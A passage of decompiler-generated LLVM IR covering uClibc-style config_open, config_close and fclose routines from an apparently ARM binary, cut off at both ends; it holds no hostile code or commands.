  uselistorder label %dec_label_pc_16b84, { 1, 0 }
  uselistorder label %dec_label_pc_16954.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16ae4, { 1, 0 }
  uselistorder label %dec_label_pc_16abc, { 1, 0 }
  uselistorder label %dec_label_pc_16ab0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_16a74, { 1, 0 }
  uselistorder label %dec_label_pc_169a8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_16c1c = icmp eq i32* %arg1, null
  br i1 %v2_16c1c, label %dec_label_pc_16c44, label %dec_label_pc_16c24

dec_label_pc_16c24:                               ; preds = %entry
  %v2_16c24 = load i32, i32* %arg1, align 4
  %v1_16c28 = inttoptr i32 %v2_16c24 to i16*
  %v2_16c28 = call i32 @__GI_fclose(i16* %v1_16c28)
  %v0_16c2c = load i32, i32* @r4, align 4
  %v1_16c2c = add i32 %v0_16c2c, 20
  %v2_16c2c = inttoptr i32 %v1_16c2c to i32*
  %v3_16c2c = load i32, i32* %v2_16c2c, align 4
  %v2_16c30 = icmp eq i32 %v3_16c2c, 0
  br i1 %v2_16c30, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_16c24
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_16c24, %bb
  store i32 93244, i32* @lr, align 4
  %v1_16c38 = xor i1 %v2_16c30, true
  call void @__pseudo_cond_branch(i1 %v1_16c38, i32 ptrtoint (i32* @global_var_14304.33 to i32))
  %v0_16c3c = load i32, i32* @r4, align 4
  store i32 %v0_16c3c, i32* @r0, align 4
  %v0_16c40 = call i32 @free()
  br label %dec_label_pc_16c44

dec_label_pc_16c44:                               ; preds = %entry, %bb6
  %v1_16c48 = phi i32 [ 0, %entry ], [ %v0_16c40, %bb6 ]
  ret i32 %v1_16c48

; uselistorder directives
  uselistorder label %dec_label_pc_16c44, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16c58 = load i32, i32* @r4, align 4
  store i32 %v3_16c58, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 -34132), i32* @r1, align 4
  %v0_16c60 = call i32 @__GI_fopen()
  store i32 %v0_16c60, i32* %r0.global-to-local, align 4
  store i32 %v0_16c60, i32* @r4, align 4
  %v2_16c64 = icmp eq i32 %v0_16c60, 0
  br i1 %v2_16c64, label %bb, label %dec_label_pc_16c70

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_16c70:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_16c78 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_16c78, i32* %r0.global-to-local, align 4
  %v2_16c7c = icmp eq i32 %v2_16c78, 0
  br i1 %v2_16c7c, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_16c70
  %v1_16c80 = load i32, i32* @r4, align 4
  %v3_16c80 = inttoptr i32 %v2_16c78 to i32*
  store i32 %v1_16c80, i32* %v3_16c80, align 4
  %v1_16c88.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_16c70, %bb4
  %v1_16c88 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_16c70 ], [ %v1_16c88.pre, %bb4 ]
  %v2_16c84 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16c84, i32* @r4, align 4
  ret i32 %v1_16c88

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 40, 38, 39, 37, 36, 35, 34, 33, 32, 31, 30, 0, 29, 28, 27, 26, 25, 1, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16c94 = load i32, i32* @r4, align 4
  store i32 %v3_16c94, i32* %stack_var_-36, align 4
  %v6_16c94 = load i32, i32* @r5, align 4
  %v9_16c94 = load i32, i32* @r6, align 4
  %v12_16c94 = load i32, i32* @r7, align 4
  %v2_16c98 = add i32 %tmp, 52
  %v3_16c98 = inttoptr i32 %v2_16c98 to i32*
  %v4_16c98 = load i32, i32* %v3_16c98, align 4
  store i32 %v4_16c98, i32* @sb, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16ca0 = icmp eq i32 %v4_16c98, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* @r8, align 4
  br i1 %v2_16ca0, label %dec_label_pc_16cb4, label %dec_label_pc_16d18

dec_label_pc_16cb4:                               ; preds = %entry
  %v0_16cb4 = call i32 @__aeabi_read_tp()
  store i32 %v0_16cb4, i32* %r0.global-to-local, align 4
  %v0_16cb8 = load i32, i32* @r5, align 4
  %v1_16cb8 = add i32 %v0_16cb8, 64
  %v2_16cb8 = inttoptr i32 %v1_16cb8 to i32*
  %v3_16cb8 = load i32, i32* %v2_16cb8, align 4
  store i32 %v3_16cb8, i32* %r3.global-to-local, align 4
  %v1_16cbc = add i32 %v0_16cb4, -1168
  store i32 %v1_16cbc, i32* @r6, align 4
  %v3_16cc0 = icmp uge i32 %v3_16cb8, %v1_16cbc
  store i1 %v3_16cc0, i1* %cpsr_c.global-to-local, align 1
  %v9_16cc0 = icmp eq i32 %v3_16cb8, %v1_16cbc
  br i1 %v9_16cc0, label %dec_label_pc_16d0c, label %dec_label_pc_16cc8

dec_label_pc_16cc8:                               ; preds = %dec_label_pc_16cb4
  %v1_16cc8 = add i32 %v0_16cb8, 56
  store i32 %v1_16cc8, i32* @r7, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_16cc8, i32* %r2.global-to-local, align 4
  %v0_16cd4 = load i32, i32* @sb, align 4
  store i32 %v0_16cd4, i32* @r4, align 4
  %v1_16cd8115 = inttoptr i32 %v1_16cc8 to i32*
  %v2_16cd8116 = load i32, i32* %v1_16cd8115, align 4
  store i32 %v2_16cd8116, i32* %r3.global-to-local, align 4
  %v3_16cdc118 = icmp uge i32 %v2_16cd8116, %v0_16cd4
  store i1 %v3_16cdc118, i1* %cpsr_c.global-to-local, align 1
  %v9_16cdc124 = icmp eq i32 %v2_16cd8116, %v0_16cd4
  br i1 %v9_16cdc124, label %dec_label_pc_16ce4, label %dec_label_pc_16cfc

dec_label_pc_16ce4:                               ; preds = %dec_label_pc_16cc8, %dec_label_pc_16ce4.dec_label_pc_16cd8_crit_edge
  %v0_16ce4125 = phi i32 [ %v1_16cdc.pre, %dec_label_pc_16ce4.dec_label_pc_16cd8_crit_edge ], [ %v0_16cd4, %dec_label_pc_16cc8 ]
  store i32 %v0_16ce4125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16cf4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16cf4, label %dec_label_pc_16cf8, label %dec_label_pc_16ce4.dec_label_pc_16cd8_crit_edge

dec_label_pc_16ce4.dec_label_pc_16cd8_crit_edge:  ; preds = %dec_label_pc_16ce4
  %v0_16cd8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16cdc.pre = load i32, i32* @r4, align 4
  %v1_16cd8 = inttoptr i32 %v0_16cd8.pre to i32*
  %v2_16cd8 = load i32, i32* %v1_16cd8, align 4
  store i32 %v2_16cd8, i32* %r3.global-to-local, align 4
  %v3_16cdc = icmp uge i32 %v2_16cd8, %v1_16cdc.pre
  store i1 %v3_16cdc, i1* %cpsr_c.global-to-local, align 1
  %v9_16cdc = icmp eq i32 %v2_16cd8, %v1_16cdc.pre
  br i1 %v9_16cdc, label %dec_label_pc_16ce4, label %dec_label_pc_16cfc

dec_label_pc_16cf8:                               ; preds = %dec_label_pc_16ce4
  %v0_16cf8 = load i32, i32* @r4, align 4
  store i32 %v0_16cf8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16cfc

dec_label_pc_16cfc:                               ; preds = %dec_label_pc_16cc8, %dec_label_pc_16ce4.dec_label_pc_16cd8_crit_edge, %dec_label_pc_16cf8
  %v0_16cfc = phi i32 [ %v0_16cf8, %dec_label_pc_16cf8 ], [ %v2_16cd8116, %dec_label_pc_16cc8 ], [ %v2_16cd8, %dec_label_pc_16ce4.dec_label_pc_16cd8_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16cfc = icmp eq i32 %v0_16cfc, 0
  br i1 %v2_16cfc, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_16cfc
  %v1_16d00 = load i32, i32* @r7, align 4
  store i32 %v1_16d00, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_16cfc, %bb
  %v1_16d04 = xor i1 %v2_16cfc, true
  call void @__pseudo_cond_branch(i1 %v1_16d04, i32 ptrtoint (i32* @global_var_154bc.522 to i32))
  %v0_16d08 = load i32, i32* @r6, align 4
  %v1_16d08 = load i32, i32* @r5, align 4
  %v2_16d08 = add i32 %v1_16d08, 64
  %v3_16d08 = inttoptr i32 %v2_16d08 to i32*
  store i32 %v0_16d08, i32* %v3_16d08, align 4
  %v0_16d0c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16d0c

dec_label_pc_16d0c:                               ; preds = %dec_label_pc_16cb4, %bb41
  %v0_16d0c = phi i32 [ %v0_16cb8, %dec_label_pc_16cb4 ], [ %v0_16d0c.pre, %bb41 ]
  %v1_16d0c = add i32 %v0_16d0c, 60
  %v2_16d0c = inttoptr i32 %v1_16d0c to i32*
  %v3_16d0c = load i32, i32* %v2_16d0c, align 4
  %v1_16d10 = add i32 %v3_16d0c, 1
  store i32 %v1_16d10, i32* %r3.global-to-local, align 4
  store i32 %v1_16d10, i32* %v2_16d0c, align 4
  %v0_16d18.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16d18

dec_label_pc_16d18:                               ; preds = %entry, %dec_label_pc_16d0c
  %v1_16d20 = phi i32 [ %tmp, %entry ], [ %v0_16d18.pre, %dec_label_pc_16d0c ]
  %v1_16d18 = inttoptr i32 %v1_16d20 to i16*
  %v2_16d18 = load i16, i16* %v1_16d18, align 2
  %v3_16d18 = zext i16 %v2_16d18 to i32
  store i32 %v3_16d18, i32* %r3.global-to-local, align 4
  %v1_16d1c = and i32 %v3_16d18, 64
  %v2_16d1c = icmp eq i32 %v1_16d1c, 0
  br i1 %v2_16d1c, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_16d18
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_16d18, %bb42
  %storemerge = phi i32 [ %v1_16d20, %bb42 ], [ %v1_16d1c, %dec_label_pc_16d18 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 93480, i32* @lr, align 4
  %v1_16d24 = xor i1 %v2_16d1c, true
  call void @__pseudo_cond_branch(i1 %v1_16d24, i32 ptrtoint (i32* @global_var_17b68.615 to i32))
  %v0_16d28 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16d28, i32* %fp.global-to-local, align 4
  %v0_16d2c = load i32, i32* @r5, align 4
  %v1_16d2c = add i32 %v0_16d2c, 4
  %v2_16d2c = inttoptr i32 %v1_16d2c to i32*
  %v3_16d2c = load i32, i32* %v2_16d2c, align 4
  store i32 %v3_16d2c, i32* %r0.global-to-local, align 4
  %v1_16d30 = call i32 @__GI___libc_close(i32 %v3_16d2c)
  store i32 %v1_16d30, i32* %r0.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16d38 = load i32, i32* @r8, align 4
  %v2_16d38 = add i32 %v0_16d38, 160
  %v3_16d38 = inttoptr i32 %v2_16d38 to i32*
  %v4_16d38 = load i32, i32* %v3_16d38, align 4
  store i32 %v4_16d38, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16d3c = icmp slt i32 %v1_16d30, 0
  br i1 %v1_16d3c, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_16d44 = add i32 %v4_16d38, 8
  %v2_16d44 = inttoptr i32 %v1_16d44 to i32*
  %v3_16d44 = load i32, i32* %v2_16d44, align 4
  store i32 %v3_16d44, i32* %r3.global-to-local, align 4
  %v0_16d48 = call i32 @__aeabi_read_tp()
  store i32 %v0_16d48, i32* %r0.global-to-local, align 4
  %v1_16d4c = add i32 %v0_16d48, -1168
  store i32 %v1_16d4c, i32* %sl.global-to-local, align 4
  %v0_16d50 = load i32, i32* %r3.global-to-local, align 4
  %v3_16d50 = icmp uge i32 %v0_16d50, %v1_16d4c
  store i1 %v3_16d50, i1* %cpsr_c.global-to-local, align 1
  %v9_16d50 = icmp eq i32 %v0_16d50, %v1_16d4c
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_16d58 = load i32, i32* @r5, align 4
  %v2_16d58 = add i32 %v1_16d58, 4
  %v3_16d58 = inttoptr i32 %v2_16d58 to i32*
  store i32 -1, i32* %v3_16d58, align 4
  br i1 %v9_16d50, label %dec_label_pc_16da0, label %dec_label_pc_16d60

dec_label_pc_16d60:                               ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_16d64 = load i32, i32* @r7, align 4
  store i32 %v0_16d64, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_16d6c108 = inttoptr i32 %v0_16d64 to i32*
  %v2_16d6c109 = load i32, i32* %v1_16d6c108, align 4
  store i32 %v2_16d6c109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16d70111 = icmp eq i32 %v2_16d6c109, 0
  br i1 %v9_16d70111, label %dec_label_pc_16d78, label %dec_label_pc_16d90

dec_label_pc_16d78:                               ; preds = %dec_label_pc_16d60, %dec_label_pc_16d78.dec_label_pc_16d6c_crit_edge
  %v0_16d78112 = phi i32 [ %v1_16d70.pre, %dec_label_pc_16d78.dec_label_pc_16d6c_crit_edge ], [ 0, %dec_label_pc_16d60 ]
  store i32 %v0_16d78112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16d88 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16d88, label %dec_label_pc_16d8c, label %dec_label_pc_16d78.dec_label_pc_16d6c_crit_edge

dec_label_pc_16d78.dec_label_pc_16d6c_crit_edge:  ; preds = %dec_label_pc_16d78
  %v0_16d6c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16d70.pre = load i32, i32* @r4, align 4
  %v1_16d6c = inttoptr i32 %v0_16d6c.pre to i32*
  %v2_16d6c = load i32, i32* %v1_16d6c, align 4
  store i32 %v2_16d6c, i32* %r3.global-to-local, align 4
  %v3_16d70 = icmp uge i32 %v2_16d6c, %v1_16d70.pre
  store i1 %v3_16d70, i1* %cpsr_c.global-to-local, align 1
  %v9_16d70 = icmp eq i32 %v2_16d6c, %v1_16d70.pre
  br i1 %v9_16d70, label %dec_label_pc_16d78, label %dec_label_pc_16d90

dec_label_pc_16d8c:                               ; preds = %dec_label_pc_16d78
  %v0_16d8c = load i32, i32* @r4, align 4
  store i32 %v0_16d8c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16d90

dec_label_pc_16d90:                               ; preds = %dec_label_pc_16d60, %dec_label_pc_16d78.dec_label_pc_16d6c_crit_edge, %dec_label_pc_16d8c
  %v0_16d90 = phi i32 [ %v0_16d8c, %dec_label_pc_16d8c ], [ %v2_16d6c109, %dec_label_pc_16d60 ], [ %v2_16d6c, %dec_label_pc_16d78.dec_label_pc_16d6c_crit_edge ]
  %v1_16d90 = phi i32 [ %v0_16d8c, %dec_label_pc_16d8c ], [ 0, %dec_label_pc_16d60 ], [ %v1_16d70.pre, %dec_label_pc_16d78.dec_label_pc_16d6c_crit_edge ]
  %v3_16d90 = icmp uge i32 %v0_16d90, %v1_16d90
  store i1 %v3_16d90, i1* %cpsr_c.global-to-local, align 1
  %v9_16d90 = icmp eq i32 %v0_16d90, %v1_16d90
  br i1 %v9_16d90, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_16d90
  %v1_16d94 = load i32, i32* @r7, align 4
  store i32 %v1_16d94, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_16d90, %bb46
  %v1_16d98 = xor i1 %v9_16d90, true
  call void @__pseudo_cond_branch(i1 %v1_16d98, i32 ptrtoint (i32* @global_var_154bc.522 to i32))
  %v0_16d9c = load i32, i32* %sl.global-to-local, align 4
  %v1_16d9c = load i32, i32* @r7, align 4
  %v2_16d9c = add i32 %v1_16d9c, 8
  %v3_16d9c = inttoptr i32 %v2_16d9c to i32*
  store i32 %v0_16d9c, i32* %v3_16d9c, align 4
  br label %dec_label_pc_16da0

dec_label_pc_16da0:                               ; preds = %bb45, %bb47
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16da4 = load i32, i32* @r8, align 4
  %v2_16da4 = add i32 %v0_16da4, 160
  %v3_16da4 = inttoptr i32 %v2_16da4 to i32*
  %v4_16da4 = load i32, i32* %v3_16da4, align 4
  store i32 %v4_16da4, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16dac = add i32 %v0_16da4, 12
  %v3_16dac = inttoptr i32 %v2_16dac to i32*
  %v4_16dac = load i32, i32* %v3_16dac, align 4
  store i32 %v4_16dac, i32* %r2.global-to-local, align 4
  %v1_16db0 = add i32 %v4_16da4, 4
  %v2_16db0 = inttoptr i32 %v1_16db0 to i32*
  %v3_16db0 = load i32, i32* %v2_16db0, align 4
  store i32 %v3_16db0, i32* %r1.global-to-local, align 4
  %v1_16db4 = inttoptr i32 %v4_16dac to i32*
  %v2_16db4 = load i32, i32* %v1_16db4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16db8 = icmp eq i32 %v3_16db0, 0
  %v1_16dbc = add i32 %v2_16db4, 1
  store i32 %v1_16dbc, i32* %r3.global-to-local, align 4
  store i32 %v1_16dbc, i32* %v1_16db4, align 4
  br i1 %v2_16db8, label %dec_label_pc_16dc8, label %dec_label_pc_16e28

dec_label_pc_16dc8:                               ; preds = %dec_label_pc_16da0
  %v0_16dc8 = load i32, i32* %r1.global-to-local, align 4
  %v1_16dc8 = load i32, i32* %r0.global-to-local, align 4
  %v2_16dc8 = add i32 %v1_16dc8, 8
  %v3_16dc8 = inttoptr i32 %v2_16dc8 to i32*
  store i32 %v0_16dc8, i32* %v3_16dc8, align 4
  %v0_16dcc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16dcc, i32* @r7, align 4
  br label %dec_label_pc_16dd0

dec_label_pc_16dd0:                               ; preds = %dec_label_pc_16e00.dec_label_pc_16dd0_crit_edge, %dec_label_pc_16dc8
  %v0_16dd0 = phi i32 [ %v0_16dd0.pre, %dec_label_pc_16e00.dec_label_pc_16dd0_crit_edge ], [ %v0_16dcc, %dec_label_pc_16dc8 ]
  %v1_16dd0 = inttoptr i32 %v0_16dd0 to i32*
  %v2_16dd0 = load i32, i32* %v1_16dd0, align 4
  store i32 %v2_16dd0, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16dd0, i32* %r2.global-to-local, align 4
  %v2_16ddc96 = load i32, i32* %v1_16dd0, align 4
  store i32 %v2_16ddc96, i32* %r3.global-to-local, align 4
  %v3_16de098 = icmp uge i32 %v2_16ddc96, %v2_16dd0
  store i1 %v3_16de098, i1* %cpsr_c.global-to-local, align 1
  %v9_16de0104 = icmp eq i32 %v2_16ddc96, %v2_16dd0
  br i1 %v9_16de0104, label %dec_label_pc_16de8, label %dec_label_pc_16e00

dec_label_pc_16de8:                               ; preds = %dec_label_pc_16dd0, %dec_label_pc_16de8.dec_label_pc_16ddc_crit_edge
  %v0_16de8105 = phi i32 [ %v1_16de0.pre, %dec_label_pc_16de8.dec_label_pc_16ddc_crit_edge ], [ %v2_16dd0, %dec_label_pc_16dd0 ]
  store i32 %v0_16de8105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16df8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16df8, label %dec_label_pc_16dfc, label %dec_label_pc_16de8.dec_label_pc_16ddc_crit_edge

dec_label_pc_16de8.dec_label_pc_16ddc_crit_edge:  ; preds = %dec_label_pc_16de8
  %v0_16ddc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16de0.pre = load i32, i32* @r4, align 4
  %v1_16ddc = inttoptr i32 %v0_16ddc.pre to i32*
  %v2_16ddc = load i32, i32* %v1_16ddc, align 4
  store i32 %v2_16ddc, i32* %r3.global-to-local, align 4
  %v3_16de0 = icmp uge i32 %v2_16ddc, %v1_16de0.pre
  store i1 %v3_16de0, i1* %cpsr_c.global-to-local, align 1
  %v9_16de0 = icmp eq i32 %v2_16ddc, %v1_16de0.pre
  br i1 %v9_16de0, label %dec_label_pc_16de8, label %dec_label_pc_16e00

dec_label_pc_16dfc:                               ; preds = %dec_label_pc_16de8
  %v0_16dfc = load i32, i32* @r4, align 4
  store i32 %v0_16dfc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16e00

dec_label_pc_16e00:                               ; preds = %dec_label_pc_16dd0, %dec_label_pc_16de8.dec_label_pc_16ddc_crit_edge, %dec_label_pc_16dfc
  %v0_16e08 = phi i32 [ %v0_16dfc, %dec_label_pc_16dfc ], [ %v2_16ddc96, %dec_label_pc_16dd0 ], [ %v2_16ddc, %dec_label_pc_16de8.dec_label_pc_16ddc_crit_edge ]
  %v1_16e00 = phi i32 [ %v0_16dfc, %dec_label_pc_16dfc ], [ %v2_16dd0, %dec_label_pc_16dd0 ], [ %v1_16de0.pre, %dec_label_pc_16de8.dec_label_pc_16ddc_crit_edge ]
  %v3_16e00 = icmp uge i32 %v0_16e08, %v1_16e00
  store i1 %v3_16e00, i1* %cpsr_c.global-to-local, align 1
  %v9_16e00 = icmp eq i32 %v0_16e08, %v1_16e00
  br i1 %v9_16e00, label %dec_label_pc_16e08, label %dec_label_pc_16e00.dec_label_pc_16dd0_crit_edge

dec_label_pc_16e00.dec_label_pc_16dd0_crit_edge:  ; preds = %dec_label_pc_16e00
  %v0_16dd0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16dd0

dec_label_pc_16e08:                               ; preds = %dec_label_pc_16e00
  %v2_16e08 = icmp ne i32 %v1_16e00, 0
  store i1 %v2_16e08, i1* %cpsr_c.global-to-local, align 1
  %v7_16e0c = icmp slt i32 %v1_16e00, 2
  br i1 %v7_16e0c, label %dec_label_pc_16e28, label %dec_label_pc_16e10

dec_label_pc_16e10:                               ; preds = %dec_label_pc_16e08
  %v0_16e10 = load i32, i32* @r7, align 4
  store i32 %v0_16e10, i32* %r0.global-to-local, align 4
  %v0_16e14 = load i32, i32* %r1.global-to-local, align 4
  %v1_16e14 = add i32 %v0_16e14, 129
  store i32 %v1_16e14, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16e28

dec_label_pc_16e28:                               ; preds = %dec_label_pc_16da0, %dec_label_pc_16e10, %dec_label_pc_16e08
  %v0_16e28 = load i32, i32* @r5, align 4
  %v1_16e28 = inttoptr i32 %v0_16e28 to i16*
  %v2_16e28 = load i16, i16* %v1_16e28, align 2
  %v3_16e28 = zext i16 %v2_16e28 to i32
  %v1_16e2c = and i32 %v3_16e28, 24576
  %v1_16e30 = or i32 %v1_16e2c, 48
  store i32 %v1_16e30, i32* %r3.global-to-local, align 4
  %v0_16e34 = load i32, i32* @sb, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16e34 = icmp eq i32 %v0_16e34, 0
  %v1_16e38 = trunc i32 %v1_16e30 to i16
  store i16 %v1_16e38, i16* %v1_16e28, align 2
  br i1 %v2_16e34, label %dec_label_pc_16e40, label %dec_label_pc_16eb4

dec_label_pc_16e40:                               ; preds = %dec_label_pc_16e28
  %v0_16e40 = load i32, i32* @r5, align 4
  %v1_16e40 = add i32 %v0_16e40, 60
  %v2_16e40 = inttoptr i32 %v1_16e40 to i32*
  %v3_16e40 = load i32, i32* %v2_16e40, align 4
  %v1_16e44 = add i32 %v3_16e40, -1
  store i32 %v1_16e44, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16e48 = icmp eq i32 %v1_16e44, 0
  store i32 %v1_16e44, i32* %v2_16e40, align 4
  br i1 %v2_16e48, label %dec_label_pc_16e54, label %dec_label_pc_16eb4

dec_label_pc_16e54:                               ; preds = %dec_label_pc_16e40
  %v0_16e54 = load i32, i32* %r3.global-to-local, align 4
  %v1_16e54 = load i32, i32* @r5, align 4
  %v2_16e54 = add i32 %v1_16e54, 64
  %v3_16e54 = inttoptr i32 %v2_16e54 to i32*
  store i32 %v0_16e54, i32* %v3_16e54, align 4
  %v0_16e58 = load i32, i32* @r5, align 4
  %v1_16e58 = add i32 %v0_16e58, 56
  store i32 %v1_16e58, i32* @r6, align 4
  br label %dec_label_pc_16e5c

dec_label_pc_16e5c:                               ; preds = %dec_label_pc_16e8c.dec_label_pc_16e5c_crit_edge, %dec_label_pc_16e54
  %v0_16e64 = phi i32 [ %v0_16e64.pre, %dec_label_pc_16e8c.dec_label_pc_16e5c_crit_edge ], [ %v1_16e58, %dec_label_pc_16e54 ]
  %v0_16e5c = phi i32 [ %v0_16e5c.pre, %dec_label_pc_16e8c.dec_label_pc_16e5c_crit_edge ], [ %v0_16e58, %dec_label_pc_16e54 ]
  %v1_16e5c = add i32 %v0_16e5c, 56
  %v2_16e5c = inttoptr i32 %v1_16e5c to i32*
  %v3_16e5c = load i32, i32* %v2_16e5c, align 4
  store i32 %v3_16e5c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16e64, i32* %r2.global-to-local, align 4
  %v1_16e6882 = inttoptr i32 %v0_16e64 to i32*
  %v2_16e6883 = load i32, i32* %v1_16e6882, align 4
  store i32 %v2_16e6883, i32* %r3.global-to-local, align 4
  %v3_16e6c85 = icmp uge i32 %v2_16e6883, %v3_16e5c
  store i1 %v3_16e6c85, i1* %cpsr_c.global-to-local, align 1
  %v9_16e6c91 = icmp eq i32 %v2_16e6883, %v3_16e5c
  br i1 %v9_16e6c91, label %dec_label_pc_16e74, label %dec_label_pc_16e8c

dec_label_pc_16e74:                               ; preds = %dec_label_pc_16e5c, %dec_label_pc_16e74.dec_label_pc_16e68_crit_edge
  %v0_16e7492 = phi i32 [ %v1_16e6c.pre, %dec_label_pc_16e74.dec_label_pc_16e68_crit_edge ], [ %v3_16e5c, %dec_label_pc_16e5c ]
  store i32 %v0_16e7492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16e84 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16e84, label %dec_label_pc_16e88, label %dec_label_pc_16e74.dec_label_pc_16e68_crit_edge

dec_label_pc_16e74.dec_label_pc_16e68_crit_edge:  ; preds = %dec_label_pc_16e74
  %v0_16e68.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16e6c.pre = load i32, i32* @r4, align 4
  %v1_16e68 = inttoptr i32 %v0_16e68.pre to i32*
  %v2_16e68 = load i32, i32* %v1_16e68, align 4
  store i32 %v2_16e68, i32* %r3.global-to-local, align 4
  %v3_16e6c = icmp uge i32 %v2_16e68, %v1_16e6c.pre
  store i1 %v3_16e6c, i1* %cpsr_c.global-to-local, align 1
  %v9_16e6c = icmp eq i32 %v2_16e68, %v1_16e6c.pre
  br i1 %v9_16e6c, label %dec_label_pc_16e74, label %dec_label_pc_16e8c

dec_label_pc_16e88:                               ; preds = %dec_label_pc_16e74
  %v0_16e88 = load i32, i32* @r4, align 4
  store i32 %v0_16e88, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16e8c

dec_label_pc_16e8c:                               ; preds = %dec_label_pc_16e5c, %dec_label_pc_16e74.dec_label_pc_16e68_crit_edge, %dec_label_pc_16e88
  %v0_16e94 = phi i32 [ %v0_16e88, %dec_label_pc_16e88 ], [ %v2_16e6883, %dec_label_pc_16e5c ], [ %v2_16e68, %dec_label_pc_16e74.dec_label_pc_16e68_crit_edge ]
